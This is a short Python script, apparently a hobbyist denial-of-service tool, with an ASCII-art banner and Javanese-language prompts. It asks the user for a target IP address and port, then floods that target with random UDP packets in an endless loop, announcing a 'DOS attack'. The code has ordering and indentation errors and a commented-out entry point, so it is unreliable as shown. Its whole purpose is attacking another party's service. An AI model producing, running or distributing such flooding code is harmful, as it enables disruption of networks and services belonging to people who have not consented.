import socket
import threading
import os
import sys
import time
import random
import fade


os.system("clear")
print(logo)
logo = """
_____       ___         _____          _________    _________
|   |      |  |        /     \        /   ___   \  /______   \
|   |      |  |       /   /\  \      |   |    |  |        |   |
|   |      |  |      /   /  \  \     |   |    |  |     __/   /
|   |______|  |     /   /    \  \    |   |    |  |   /___    \
|    ______   |    /   /______\  \   |   |    |  |        \   |
|   |      |  |   /   _________   \  |   |____|  |  ______/   /
|___|      |__|  /___/          \__\  \______    /  \________/
                                             \___\
═════════════════════════════════════════════════════════



═════════════════════════════════════════════════════════
"""
def main():
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1492)

ip = input("Monggo kangmas/mbakyu masukan IP targetnya: ")
port = int(input("Ojo lali port juga Yo..!!: "))
# delay = int(input('Enter interval 1~1000'))
input('Press any key to start DOS attack on %s:%s'% (ip,port))

sock.sendto(bytes, (ip,port))
print ("Packet sent to %s:%d" % (ip,port))
# sent = 0
while True:
sock.sendto(bytes, (ip,port))
# sent = sent + 1
# print ("Packet sent to %s:%d" % (ip,port))
#time.sleep((1000-delay)/2000) if __name__ == "__main__": main()
